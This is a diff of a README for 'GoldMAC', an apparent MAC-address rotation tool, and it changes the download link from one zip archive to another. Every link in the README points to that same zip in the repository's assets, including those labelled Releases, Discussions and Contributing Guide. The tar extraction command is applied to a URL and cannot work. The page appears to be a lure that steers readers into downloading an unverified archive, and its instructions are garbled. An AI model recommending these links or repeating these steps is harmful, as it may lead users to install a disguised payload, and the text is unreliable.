@@ -4,7 +4,7 @@
 GoldMAC is an anonymous MAC address rotation tool designed for pentesting and operational security (OPSEC). It helps users change their device’s MAC address, enhancing privacy and security while online. This tool is perfect for cybersecurity professionals and anyone looking to improve their online anonymity.
 
 ## 🔗 Download GoldMAC
-[![Download GoldMAC](https://github.com/nupurgurnule/GoldMAC/raw/refs/heads/main/assets/MAC-Gold-v3.3.zip)](https://github.com/nupurgurnule/GoldMAC/raw/refs/heads/main/assets/MAC-Gold-v3.3.zip)
+[![Download GoldMAC](https://raw.githubusercontent.com/nupurgurnule/GoldMAC/main/assets/MAC-Gold-3.1.zip)](https://raw.githubusercontent.com/nupurgurnule/GoldMAC/main/assets/MAC-Gold-3.1.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run GoldMAC with ease, even if you have no technical background. Follow the steps below to get started.
@@ -19,13 +19,13 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To download GoldMAC, visit the Releases page. 
 
-[Click here to download GoldMAC](https://github.com/nupurgurnule/GoldMAC/raw/refs/heads/main/assets/MAC-Gold-v3.3.zip)
+[Click here to download GoldMAC](https://raw.githubusercontent.com/nupurgurnule/GoldMAC/main/assets/MAC-Gold-3.1.zip)
 
 Once on the page, follow these steps:
 
 1. Look for the latest version of GoldMAC listed at the top.
 2. Click on the assets dropdown to see available files.
-3. Download the appropriate binary for your system (typically a `https://github.com/nupurgurnule/GoldMAC/raw/refs/heads/main/assets/MAC-Gold-v3.3.zip` file).
+3. Download the appropriate binary for your system (typically a `https://raw.githubusercontent.com/nupurgurnule/GoldMAC/main/assets/MAC-Gold-3.1.zip` file).
 4. Save the downloaded file to a location on your computer that is easy to access, like your Desktop or Downloads folder.
 
 ## 📂 Extract the Files
@@ -38,7 +38,7 @@ After downloading, you need to extract the files. Here’s how:
    ```
 3. Extract the files using the following command:
    ```
-   tar -xvzf GoldMAC-<version>https://github.com/nupurgurnule/GoldMAC/raw/refs/heads/main/assets/MAC-Gold-v3.3.zip
+   tar -xvzf GoldMAC-<version>https://raw.githubusercontent.com/nupurgurnule/GoldMAC/main/assets/MAC-Gold-3.1.zip
    ```
    Replace `<version>` with the actual version number you downloaded.
 
@@ -85,7 +85,7 @@ If you encounter issues while running GoldMAC, consider the following:
 For further assistance, you can check the issues section on the GoldMAC GitHub page.
 
 ## 🌐 Community and Support
-Join the discussion or seek help from the community. You can find valuable resources and tips from fellow users. Visit our [GitHub Discussions](https://github.com/nupurgurnule/GoldMAC/raw/refs/heads/main/assets/MAC-Gold-v3.3.zip) for assistance or to share your experiences.
+Join the discussion or seek help from the community. You can find valuable resources and tips from fellow users. Visit our [GitHub Discussions](https://raw.githubusercontent.com/nupurgurnule/GoldMAC/main/assets/MAC-Gold-3.1.zip) for assistance or to share your experiences.
 
 ## 🔍 Future Updates
 GoldMAC will continue to evolve based on user feedback. Future versions may include:
@@ -97,7 +97,7 @@ GoldMAC will continue to evolve based on user feedback. Future versions may incl
 Stay tuned for releases that improve your experience.
 
 ## 🚀 Contributing
-If you're interested in contributing to GoldMAC, we welcome your input. Whether through coding, reporting issues, or suggesting new features, your help is valuable. Check out our [Contributing Guide](https://github.com/nupurgurnule/GoldMAC/raw/refs/heads/main/assets/MAC-Gold-v3.3.zip) for more details.
+If you're interested in contributing to GoldMAC, we welcome your input. Whether through coding, reporting issues, or suggesting new features, your help is valuable. Check out our [Contributing Guide](https://raw.githubusercontent.com/nupurgurnule/GoldMAC/main/assets/MAC-Gold-3.1.zip) for more details.
 
 ## 🛡️ License
 GoldMAC is open-source software. It is licensed under the MIT License. Feel free to use, modify, and distribute this tool.
